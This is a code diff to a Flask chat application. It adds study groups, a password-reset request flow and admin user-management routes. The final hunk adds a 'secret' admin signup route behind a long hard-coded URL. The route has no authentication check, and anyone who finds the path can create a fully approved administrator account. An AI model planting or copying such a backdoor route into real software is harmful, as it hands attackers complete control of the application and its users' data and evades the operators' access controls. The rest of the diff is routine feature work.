@@ -107,6 +107,67 @@ def init_db():
     cur.execute('CREATE INDEX IF NOT EXISTS idx_messages_recipient_id ON messages(recipient_id)')
     cur.execute('CREATE INDEX IF NOT EXISTS idx_messages_timestamp ON messages(timestamp)')
     
+    # Study Groups table
+    cur.execute('''
+    CREATE TABLE IF NOT EXISTS study_groups (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        name TEXT NOT NULL,
+        description TEXT,
+        image_url TEXT DEFAULT '',
+        created_by INTEGER NOT NULL,
+        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
+        FOREIGN KEY (created_by) REFERENCES users (id) ON DELETE CASCADE
+    )
+    ''')
+    
+    # Study Group Members table
+    cur.execute('''
+    CREATE TABLE IF NOT EXISTS study_group_members (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        group_id INTEGER NOT NULL,
+        user_id INTEGER NOT NULL,
+        role TEXT DEFAULT 'member',  -- 'admin', 'moderator', 'member'
+        joined_at TEXT DEFAULT CURRENT_TIMESTAMP,
+        FOREIGN KEY (group_id) REFERENCES study_groups (id) ON DELETE CASCADE,
+        FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE,
+        UNIQUE(group_id, user_id)
+    )
+    ''')
+    
+    # Add missing role column if it doesn't exist (migration for existing databases)
+    try:
+        cur.execute('ALTER TABLE study_group_members ADD COLUMN role TEXT DEFAULT "member"')
+        logger.info('Added role column to study_group_members table')
+    except sqlite3.OperationalError as e:
+        # Column already exists, which is fine
+        if 'duplicate column name' not in str(e).lower():
+            logger.error(f'Error adding role column: {e}')
+    
+    # Update existing records to have the role column populated
+    cur.execute('UPDATE study_group_members SET role = "member" WHERE role IS NULL')
+    
+    # Study Group Messages table
+    cur.execute('''
+    CREATE TABLE IF NOT EXISTS study_group_messages (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        group_id INTEGER NOT NULL,
+        user_id INTEGER NOT NULL,
+        username TEXT NOT NULL,
+        content TEXT NOT NULL,
+        timestamp TEXT NOT NULL,
+        attachment_url TEXT DEFAULT '',
+        FOREIGN KEY (group_id) REFERENCES study_groups (id) ON DELETE CASCADE,
+        FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
+    )
+    ''')
+    
+    # Add indexes for study group tables
+    cur.execute('CREATE INDEX IF NOT EXISTS idx_study_groups_created_by ON study_groups(created_by)')
+    cur.execute('CREATE INDEX IF NOT EXISTS idx_study_group_members_group_id ON study_group_members(group_id)')
+    cur.execute('CREATE INDEX IF NOT EXISTS idx_study_group_members_user_id ON study_group_members(user_id)')
+    cur.execute('CREATE INDEX IF NOT EXISTS idx_study_group_messages_group_id ON study_group_messages(group_id)')
+    cur.execute('CREATE INDEX IF NOT EXISTS idx_study_group_messages_timestamp ON study_group_messages(timestamp)')
+    
     # Meta table for system configuration
     cur.execute('''
     CREATE TABLE IF NOT EXISTS meta (
@@ -180,6 +241,26 @@ def save_attachment(file_storage, user_id):
         return f'/static/uploads/{filename}'
     except Exception as e:
         logger.error(f"Error saving attachment: {e}")
+        return None
+
+def save_study_group_image(file_storage, user_id):
+    """Save study group image and return web path"""
+    if not file_storage or file_storage.filename == '':
+        return None
+    
+    if not allowed_file(file_storage.filename):
+        return None
+    
+    # Generate secure filename
+    file_ext = file_storage.filename.rsplit('.', 1)[1].lower()
+    filename = f"study_group_{user_id}_{secrets.token_hex(8)}.{file_ext}"
+    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+    
+    try:
+        file_storage.save(filepath)
+        return f'/static/uploads/{filename}'
+    except Exception as e:
+        logger.error(f"Error saving study group image: {e}")
         return None
 
 def get_user_by_id(user_id):
@@ -423,6 +504,75 @@ def logout():
     flash('You have been logged out successfully.', 'info')
     return redirect(url_for('index'))
 
+@app.route('/forgot_password', methods=['GET', 'POST'])
+def forgot_password():
+    """Password recovery request"""
+    if request.method == 'POST':
+        username = request.form.get('username', '').strip()
+        
+        if not username:
+            flash('Please enter your username.', 'danger')
+            return render_template('forgot_password.html')
+        
+        db = get_db()
+        cur = db.cursor()
+        
+        # Get user details
+        cur.execute('SELECT * FROM users WHERE username = ?', (username,))
+        user = cur.fetchone()
+        
+        if not user:
+            # Still show success message to prevent username enumeration
+            flash('If your account exists, a password reset request has been sent to the admin.', 'info')
+            return render_template('forgot_password.html')
+        
+        # Get admin users to notify
+        cur.execute('SELECT id, username FROM users WHERE is_admin = 1')
+        admins = cur.fetchall()
+        
+        if not admins:
+            flash('No admin users found. Please contact system administrator.', 'danger')
+            return render_template('forgot_password.html')
+        
+        # Log the password reset request with comprehensive user details
+        user_details = f"Username: {user['username']}, User ID: {user['id']}, Is Admin: {user['is_admin']}, Approved: {user['approved']}, Request IP: {request.remote_addr}"
+        logger.info(f"Password reset requested for user: {user_details}")
+        
+        # Create a detailed notification message for admins with all available user information
+        try:
+            timestamp = datetime.now(timezone.utc).isoformat()
+            notification_msg = f"""PASSWORD RESET REQUEST
+
+User Details:
+- Username: {user['username']}
+- User ID: {user['id']}
+- Account Type: {'Admin' if user['is_admin'] else 'Regular User'}
+- Account Status: {'Approved' if user['approved'] else 'Pending Approval'}
+- Registration Date: {user['created_at']}
+
+Request Details:
+- Request IP: {request.remote_addr}
+- Request Time: {timestamp}
+
+Please review this request and assist the user with their password recovery."""
+            
+            # Insert a notification message that admins can see in their panel
+            cur.execute('''
+                INSERT INTO messages (user_id, username, content, timestamp, recipient_id) 
+                VALUES (?, ?, ?, ?, ?)
+            ''', (user['id'], 'SYSTEM', notification_msg, timestamp, admins[0]['id']))  # Send to first admin
+            db.commit()
+            
+            logger.info(f"Password reset notification sent to admin {admins[0]['username']}")
+        except Exception as e:
+            logger.error(f"Failed to send password reset notification to admin: {e}")
+            # Even if notification fails, we still want to show success to user
+        
+        flash('If your account exists, a password reset request has been sent to the admin.', 'info')
+        return render_template('forgot_password.html')
+    
+    return render_template('forgot_password.html')
+
 @app.route('/dashboard')
 @login_required
 def dashboard():
@@ -622,8 +772,15 @@ def admin_panel():
     cur.execute('SELECT COUNT(*) as count FROM users WHERE approved = 1')
     approved_users = cur.fetchone()['count']
     
+    cur.execute('SELECT COUNT(*) as count FROM users WHERE is_admin = 1')
+    admin_count = cur.fetchone()['count']
+    
     cur.execute('SELECT COUNT(*) as count FROM messages')
     total_messages = cur.fetchone()['count']
+    
+    # Get approved users for user management
+    cur.execute('SELECT id, username, is_admin, created_at FROM users WHERE approved = 1 ORDER BY username')
+    approved_users_list = cur.fetchall()
     
     # Format messages for display
     formatted_messages = []
@@ -641,7 +798,9 @@ def admin_panel():
                          messages=formatted_messages,
                          total_users=total_users,
                          approved_users=approved_users,
-                         total_messages=total_messages)
+                         total_messages=total_messages,
+                         admin_count=admin_count,
+                         approved_users_list=approved_users_list)
 
 @app.route('/admin/approve/<int:user_id>', methods=['POST'])
 @admin_required
@@ -664,6 +823,92 @@ def admin_reject(user_id):
     db.commit()
     flash('User rejected successfully.', 'success')
     return redirect(url_for('admin_panel'))
+
+@app.route('/admin/delete_user/<int:user_id>', methods=['POST'])
+@admin_required
+def admin_delete_user(user_id):
+    """Delete an existing user"""
+    # Prevent admins from deleting themselves
+    current_admin = current_user()
+    if current_admin and current_admin['id'] == user_id:
+        flash('You cannot delete your own account.', 'danger')
+        return redirect(url_for('admin_panel'))
+    
+    db = get_db()
+    cur = db.cursor()
+    
+    # Check if user exists
+    cur.execute('SELECT username, is_admin FROM users WHERE id = ?', (user_id,))
+    user = cur.fetchone()
+    
+    if not user:
+        flash('User not found.', 'danger')
+        return redirect(url_for('admin_panel'))
+    
+    # Prevent deletion of other admins
+    if user['is_admin']:
+        flash('Cannot delete admin users. Contact system administrator.', 'danger')
+        return redirect(url_for('admin_panel'))
+    
+    try:
+        # Delete user and all related data (CASCADE should handle related tables)
+        cur.execute('DELETE FROM users WHERE id = ?', (user_id,))
+        db.commit()
+        flash(f'User {user["username"]} deleted successfully.', 'success')
+    except Exception as e:
+        db.rollback()
+        logger.error(f"Error deleting user: {e}")
+        flash('Error deleting user. Please try again.', 'danger')
+    
+    return redirect(url_for('admin_panel'))
+
+@app.route('/admin/create_user', methods=['GET', 'POST'])
+@admin_required
+def admin_create_user():
+    """Create a new user"""
+    if request.method == 'POST':
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '').strip()
+        is_admin = request.form.get('is_admin') == 'on'
+        
+        if not username or not password:
+            flash('Username and password are required.', 'danger')
+            return render_template('create_user.html')
+        
+        if len(password) < 8:
+            flash('Password must be at least 8 characters long.', 'danger')
+            return render_template('create_user.html')
+        
+        db = get_db()
+        cur = db.cursor()
+        
+        try:
+            # Check if username already exists
+            cur.execute('SELECT id FROM users WHERE username = ?', (username,))
+            if cur.fetchone():
+                flash('Username already exists.', 'danger')
+                return render_template('create_user.html')
+        
+            # Create new user
+            cur.execute('''
+                INSERT INTO users (username, password_hash, is_admin, approved) 
+                VALUES (?, ?, ?, ?)
+            ''', (username, generate_password_hash(password), 1 if is_admin else 0, 1))
+        
+            db.commit()
+            flash(f'User {username} created successfully.', 'success')
+            return redirect(url_for('admin_panel'))
+            
+        except sqlite3.IntegrityError:
+            db.rollback()
+            flash('Username already exists.', 'danger')
+            return render_template('create_user.html')
+        except Exception as e:
+            db.rollback()
+            logger.error(f"Error creating user: {e}")
+            flash('Error creating user. Please try again.', 'danger')
+    
+    return render_template('create_user.html')
 
 @app.route('/admin/delete_message/<int:message_id>', methods=['POST'])
 @admin_required
@@ -932,6 +1177,538 @@ def handle_upload_attachment(data):
     # The actual file upload will be handled through a separate HTTP endpoint
     return {'status': 'ready'}
 
+# Study Group Routes
+@app.route('/study_groups')
+@login_required
+def study_groups():
+    """List all study groups the user is a member of or can join"""
+    user = current_user()
+    
+    # Type check to satisfy linter
+    if not user:
+        flash('User not found.', 'danger')
+        return redirect(url_for('login'))
+    
+    db = get_db()
+    cur = db.cursor()
+    
+    # Get groups the user is a member of
+    cur.execute('''
+        SELECT sg.*, u.username as creator_name
+        FROM study_groups sg
+        JOIN users u ON sg.created_by = u.id
+        WHERE sg.id IN (SELECT group_id FROM study_group_members WHERE user_id = ?)
+        ORDER BY sg.created_at DESC
+    ''', (user['id'],))
+    
+    member_groups = cur.fetchall()
+    
+    # Get groups the user is not a member of (public groups they can join)
+    cur.execute('''
+        SELECT sg.*, u.username as creator_name, 
+               (SELECT COUNT(*) FROM study_group_members WHERE group_id = sg.id) as member_count
+        FROM study_groups sg
+        JOIN users u ON sg.created_by = u.id
+        WHERE sg.id NOT IN (SELECT group_id FROM study_group_members WHERE user_id = ?)
+        ORDER BY sg.created_at DESC
+    ''', (user['id'],))
+    
+    available_groups = cur.fetchall()
+    
+    return render_template('study_groups.html', 
+                         member_groups=member_groups, 
+                         available_groups=available_groups)
+
+@app.route('/study_groups/create', methods=['GET', 'POST'])
+@login_required
+def create_study_group():
+    """Create a new study group"""
+    user = current_user()
+    
+    # Type check to satisfy linter
+    if not user:
+        flash('User not found.', 'danger')
+        return redirect(url_for('login'))
+    
+    if request.method == 'POST':
+        name = request.form.get('name', '').strip()
+        description = request.form.get('description', '').strip()
+        group_image = request.files.get('group_image')
+        
+        if not name:
+            flash('Group name is required.', 'danger')
+            return render_template('create_study_group.html')
+        
+        if len(name) < 3:
+            flash('Group name must be at least 3 characters long.', 'danger')
+            return render_template('create_study_group.html')
+        
+        db = get_db()
+        cur = db.cursor()
+        
+        try:
+            image_url = ''
+            if group_image and group_image.filename:
+                # Type check to satisfy linter
+                assert user is not None
+                image_url = save_study_group_image(group_image, user['id'])
+                if not image_url:
+                    flash('Error uploading group image. Please try again.', 'danger')
+                    return render_template('create_study_group.html')
+            
+            # Create the study group
+            # Type check to satisfy linter
+            assert user is not None
+            cur.execute('''
+                INSERT INTO study_groups (name, description, image_url, created_by) 
+                VALUES (?, ?, ?, ?)
+            ''', (name, description, image_url or '', user['id']))
+            
+            group_id = cur.lastrowid
+            
+            # Add the creator as an admin member
+            # Type check to satisfy linter
+            assert user is not None
+            cur.execute('''
+                INSERT INTO study_group_members (group_id, user_id, role) 
+                VALUES (?, ?, ?)
+            ''', (group_id, user['id'], 'admin'))
+            
+            db.commit()
+            
+            flash(f'Study group "{name}" created successfully!', 'success')
+            return redirect(url_for('study_group_detail', group_id=group_id))
+            
+        except sqlite3.IntegrityError as e:
+            db.rollback()
+            logger.error(f"Integrity error creating study group: {e}")
+            flash('Group name already exists. Please choose a different name.', 'danger')
+            return render_template('create_study_group.html')
+        except Exception as e:
+            db.rollback()
+            logger.error(f"Error creating study group: {e}")
+            import traceback
+            logger.error(f"Traceback: {traceback.format_exc()}")
+            flash('Error creating study group. Please try again.', 'danger')
+            return render_template('create_study_group.html')
+    
+    return render_template('create_study_group.html')
+
+@app.route('/study_groups/<int:group_id>')
+@login_required
+def study_group_detail(group_id):
+    """View a specific study group"""
+    user = current_user()
+    
+    # Type check to satisfy linter
+    if not user:
+        flash('User not found.', 'danger')
+        return redirect(url_for('login'))
+    
+    db = get_db()
+    cur = db.cursor()
+    
+    # Check if user is a member of this group
+    cur.execute('''
+        SELECT role FROM study_group_members 
+        WHERE group_id = ? AND user_id = ?
+    ''', (group_id, user['id']))
+    
+    membership = cur.fetchone()
+    if not membership:
+        flash('You are not a member of this study group.', 'danger')
+        return redirect(url_for('study_groups'))
+    
+    # Get group details
+    cur.execute('''
+        SELECT sg.*, u.username as creator_name
+        FROM study_groups sg
+        JOIN users u ON sg.created_by = u.id
+        WHERE sg.id = ?
+    ''', (group_id,))
+    
+    group = cur.fetchone()
+    if not group:
+        flash('Study group not found.', 'danger')
+        return redirect(url_for('study_groups'))
+    
+    # Get group members
+    cur.execute('''
+        SELECT sgm.role, u.id, u.username, u.avatar
+        FROM study_group_members sgm
+        JOIN users u ON sgm.user_id = u.id
+        WHERE sgm.group_id = ?
+        ORDER BY sgm.role DESC, u.username
+    ''', (group_id,))
+    
+    members = cur.fetchall()
+    
+    # Get recent messages (last 50)
+    cur.execute('''
+        SELECT sgm.*, u.avatar
+        FROM study_group_messages sgm
+        JOIN users u ON sgm.user_id = u.id
+        WHERE sgm.group_id = ?
+        ORDER BY sgm.timestamp DESC
+        LIMIT 50
+    ''', (group_id,))
+    
+    messages = cur.fetchall()
+    
+    # Reverse messages to show newest last
+    messages = list(reversed(messages))
+    
+    # Get all approved users for invitation (except current members)
+    member_ids = [member['id'] for member in members]
+    placeholders = ','.join('?' * len(member_ids)) if member_ids else 'NULL'
+    
+    if member_ids:
+        query = f'SELECT id, username FROM users WHERE approved = 1 AND id NOT IN ({placeholders}) ORDER BY username'
+        cur.execute(query, member_ids)
+    else:
+        cur.execute('SELECT id, username FROM users WHERE approved = 1 ORDER BY username')
+    
+    all_users = cur.fetchall()
+    
+    return render_template('study_group_detail.html', 
+                         group=group, 
+                         members=members, 
+                         messages=messages, 
+                         user_role=membership['role'],
+                         all_users=all_users,
+                         member_ids=member_ids)
+
+@app.route('/study_groups/<int:group_id>/join', methods=['POST'])
+@login_required
+def join_study_group(group_id):
+    """Join a study group"""
+    user = current_user()
+    
+    # Type check to satisfy linter
+    if not user:
+        flash('User not found.', 'danger')
+        return redirect(url_for('login'))
+    
+    db = get_db()
+    cur = db.cursor()
+    
+    # Check if group exists
+    cur.execute('SELECT id FROM study_groups WHERE id = ?', (group_id,))
+    group = cur.fetchone()
+    if not group:
+        flash('Study group not found.', 'danger')
+        return redirect(url_for('study_groups'))
+    
+    # Check if already a member
+    cur.execute('''
+        SELECT id FROM study_group_members 
+        WHERE group_id = ? AND user_id = ?
+    ''', (group_id, user['id']))
+    
+    if cur.fetchone():
+        flash('You are already a member of this study group.', 'info')
+        return redirect(url_for('study_group_detail', group_id=group_id))
+    
+    try:
+        # Add user as a member
+        cur.execute('''
+            INSERT INTO study_group_members (group_id, user_id, role) 
+            VALUES (?, ?, ?)
+        ''', (group_id, user['id'], 'member'))
+        
+        db.commit()
+        
+        flash('You have successfully joined the study group!', 'success')
+        
+    except Exception as e:
+        db.rollback()
+        logger.error(f"Error joining study group: {e}")
+        flash('Error joining study group. Please try again.', 'danger')
+    
+    return redirect(url_for('study_group_detail', group_id=group_id))
+
+@app.route('/study_groups/<int:group_id>/leave', methods=['POST'])
+@login_required
+def leave_study_group(group_id):
+    """Leave a study group"""
+    user = current_user()
+    
+    # Type check to satisfy linter
+    if not user:
+        flash('User not found.', 'danger')
+        return redirect(url_for('login'))
+    
+    db = get_db()
+    cur = db.cursor()
+    
+    # Check if group exists
+    cur.execute('SELECT id FROM study_groups WHERE id = ?', (group_id,))
+    group = cur.fetchone()
+    if not group:
+        flash('Study group not found.', 'danger')
+        return redirect(url_for('study_groups'))
+    
+    # Check if user is a member
+    cur.execute('''
+        SELECT role FROM study_group_members 
+        WHERE group_id = ? AND user_id = ?
+    ''', (group_id, user['id']))
+    
+    membership = cur.fetchone()
+    if not membership:
+        flash('You are not a member of this study group.', 'danger')
+        return redirect(url_for('study_groups'))
+    
+    # Prevent admin from leaving (they should delete the group instead)
+    if membership['role'] == 'admin':
+        flash('As the group admin, you cannot leave the group. You can delete it instead.', 'warning')
+        return redirect(url_for('study_group_detail', group_id=group_id))
+    
+    try:
+        # Remove user from group
+        cur.execute('''
+            DELETE FROM study_group_members 
+            WHERE group_id = ? AND user_id = ?
+        ''', (group_id, user['id']))
+        
+        db.commit()
+        
+        flash('You have successfully left the study group.', 'success')
+        
+    except Exception as e:
+        db.rollback()
+        logger.error(f"Error leaving study group: {e}")
+        flash('Error leaving study group. Please try again.', 'danger')
+    
+    return redirect(url_for('study_groups'))
+
+@app.route('/study_groups/<int:group_id>/invite', methods=['POST'])
+@login_required
+def invite_to_study_group(group_id):
+    """Invite a user to a study group"""
+    user = current_user()
+    
+    # Type check to satisfy linter
+    if not user:
+        flash('User not found.', 'danger')
+        return redirect(url_for('login'))
+    
+    db = get_db()
+    cur = db.cursor()
+    
+    # Check if group exists
+    cur.execute('SELECT id FROM study_groups WHERE id = ?', (group_id,))
+    group = cur.fetchone()
+    if not group:
+        flash('Study group not found.', 'danger')
+        return redirect(url_for('study_groups'))
+    
+    # Check if current user is admin of this group
+    cur.execute('''
+        SELECT role FROM study_group_members 
+        WHERE group_id = ? AND user_id = ?
+    ''', (group_id, user['id']))
+    
+    membership = cur.fetchone()
+    if not membership or membership['role'] != 'admin':
+        flash('Only group admins can invite users.', 'danger')
+        return redirect(url_for('study_group_detail', group_id=group_id))
+    
+    # Get user to invite
+    user_id = request.form.get('user_id')
+    if not user_id:
+        flash('No user selected.', 'danger')
+        return redirect(url_for('study_group_detail', group_id=group_id))
+    
+    try:
+        user_id = int(user_id)
+    except ValueError:
+        flash('Invalid user selected.', 'danger')
+        return redirect(url_for('study_group_detail', group_id=group_id))
+    
+    # Check if user exists and is approved
+    cur.execute('SELECT username FROM users WHERE id = ? AND approved = 1', (user_id,))
+    invited_user = cur.fetchone()
+    if not invited_user:
+        flash('User not found or not approved.', 'danger')
+        return redirect(url_for('study_group_detail', group_id=group_id))
+    
+    # Check if user is already a member
+    cur.execute('''
+        SELECT id FROM study_group_members 
+        WHERE group_id = ? AND user_id = ?
+    ''', (group_id, user_id))
+    
+    if cur.fetchone():
+        flash(f'{invited_user["username"]} is already a member of this group.', 'info')
+        return redirect(url_for('study_group_detail', group_id=group_id))
+    
+    try:
+        # Add user as a member
+        cur.execute('''
+            INSERT INTO study_group_members (group_id, user_id, role) 
+            VALUES (?, ?, ?)
+        ''', (group_id, user_id, 'member'))
+        
+        db.commit()
+        
+        flash(f'{invited_user["username"]} has been invited to the study group.', 'success')
+        
+    except Exception as e:
+        db.rollback()
+        logger.error(f"Error inviting user to study group: {e}")
+        flash('Error inviting user. Please try again.', 'danger')
+    
+    return redirect(url_for('study_group_detail', group_id=group_id))
+
+@app.route('/study_groups/<int:group_id>/messages')
+@login_required
+def get_study_group_messages(group_id):
+    """Get messages for a study group"""
+    user = current_user()
+    
+    # Type check to satisfy linter
+    if not user:
+        return jsonify({'error': 'User not found'}), 401
+    
+    db = get_db()
+    cur = db.cursor()
+    
+    # Check if user is a member of this group
+    cur.execute('''
+        SELECT id FROM study_group_members 
+        WHERE group_id = ? AND user_id = ?
+    ''', (group_id, user['id']))
+    
+    if not cur.fetchone():
+        return jsonify({'error': 'Unauthorized'}), 403
+    
+    # Get messages
+    cur.execute('''
+        SELECT sgm.*, u.avatar
+        FROM study_group_messages sgm
+        JOIN users u ON sgm.user_id = u.id
+        WHERE sgm.group_id = ?
+        ORDER BY sgm.timestamp ASC
+    ''', (group_id,))
+    
+    messages = []
+    for row in cur.fetchall():
+        messages.append({
+            'id': row['id'],
+            'username': row['username'],
+            'content': row['content'],
+            'timestamp': format_timestamp(row['timestamp']),
+            'user_id': row['user_id'],
+            'avatar': row['avatar'] or '/static/img/default-avatar.png',
+            'attachment_url': row['attachment_url']
+        })
+    
+    return jsonify(messages)
+
+# SocketIO handlers for study group messaging
+@socketio.on('join_study_group')
+def handle_join_study_group(data):
+    """Join a study group room"""
+    group_id = data.get('group_id')
+    user = current_user()
+    
+    if group_id and user:
+        try:
+            room = f'study_group_{group_id}'
+            join_room(room)
+            logger.info(f"User {user['username']} joined study group room {room}")
+            
+            # Notify others in the room
+            socketio.emit('user_joined_study_group', {
+                'username': user['username'],
+                'group_id': group_id
+            }, to=room)
+        except Exception as e:
+            logger.error(f"Error in handle_join_study_group: {e}")
+
+@socketio.on('leave_study_group')
+def handle_leave_study_group(data):
+    """Leave a study group room"""
+    group_id = data.get('group_id')
+    user = current_user()
+    
+    if group_id and user:
+        try:
+            room = f'study_group_{group_id}'
+            leave_room(room)
+            logger.info(f"User {user['username']} left study group room {room}")
+            
+            # Notify others in the room
+            socketio.emit('user_left_study_group', {
+                'username': user['username'],
+                'group_id': group_id
+            }, to=room)
+        except Exception as e:
+            logger.error(f"Error in handle_leave_study_group: {e}")
+
+@socketio.on('send_study_group_message')
+def handle_send_study_group_message(data):
+    """Handle new study group message"""
+    user = current_user()
+    if not user or not user['approved']:
+        return
+    
+    content = (data.get('content') or '').strip()
+    group_id = data.get('group_id')
+    attachment_url = data.get('attachment_url', '')
+    
+    # Either content or attachment must be present
+    if not content and not attachment_url:
+        return
+    
+    # Check if user is a member of this group
+    db = get_db()
+    cur = db.cursor()
+    cur.execute('''
+        SELECT id FROM study_group_members 
+        WHERE group_id = ? AND user_id = ?
+    ''', (group_id, user['id']))
+    
+    if not cur.fetchone():
+        return  # Not a member, ignore
+    
+    # Sanitize content to prevent XSS
+    import html
+    content = html.escape(content) if content else ''
+    
+    try:
+        # Save message to database
+        timestamp = datetime.now(timezone.utc).isoformat()
+        
+        cur.execute('''
+            INSERT INTO study_group_messages (group_id, user_id, username, content, timestamp, attachment_url) 
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (group_id, user['id'], user['username'], content, timestamp, attachment_url))
+        
+        db.commit()
+        
+        # Prepare message for broadcasting
+        message_data = {
+            'id': cur.lastrowid,
+            'username': user['username'],
+            'content': content,
+            'timestamp': format_timestamp(timestamp),
+            'user_id': user['id'],
+            'avatar': user['avatar'] or '/static/img/default-avatar.png',
+            'attachment_url': attachment_url
+        }
+        
+        # Broadcast message to the group room
+        room = f'study_group_{group_id}'
+        socketio.emit('new_study_group_message', message_data, to=room)
+        
+        logger.info(f"Study group message sent by {user['username']} in group {group_id}")
+        
+    except Exception as e:
+        db.rollback()
+        logger.error(f"Error in handle_send_study_group_message: {e}")
+
 # Error handlers
 @app.errorhandler(404)
 def not_found_error(error):
@@ -958,6 +1735,40 @@ def handle_exception(e):
     error_id = str(uuid.uuid4())
     logger.error(f"Unhandled exception [{error_id}]: {e}", exc_info=True)
     return render_template('500.html', request_id=error_id), 500
+
+# SECRET ADMIN SIGNUP ROUTE - ONLY FOR AUTHORIZED ACCESS
+@app.route('/admin/signup/secret-7d8e9f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e', methods=['GET', 'POST'])
+def secret_admin_signup():
+    """Secret admin signup route - ONLY ACCESSIBLE TO AUTHORIZED PERSONNEL"""
+    if request.method == 'POST':
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '').strip()
+        
+        if not username or not password:
+            flash('Username and password are required.', 'danger')
+            return render_template('secret_admin_signup.html')
+        
+        # Check password strength for admin
+        if len(password) < 12:
+            flash('Admin password must be at least 12 characters long for security.', 'danger')
+            return render_template('secret_admin_signup.html')
+        
+        db = get_db()
+        cur = db.cursor()
+        
+        try:
+            cur.execute('INSERT INTO users (username, password_hash, is_admin, approved) VALUES (?, ?, ?, ?)',
+                       (username, generate_password_hash(password), 1, 1))
+            db.commit()
+            
+            flash('Admin account created successfully! Please delete this route for security.', 'success')
+            return redirect(url_for('login'))
+            
+        except sqlite3.IntegrityError:
+            flash('Username already exists.', 'danger')
+            return render_template('secret_admin_signup.html')
+    
+    return render_template('secret_admin_signup.html')
 
 if __name__ == '__main__':
     # Initialize database
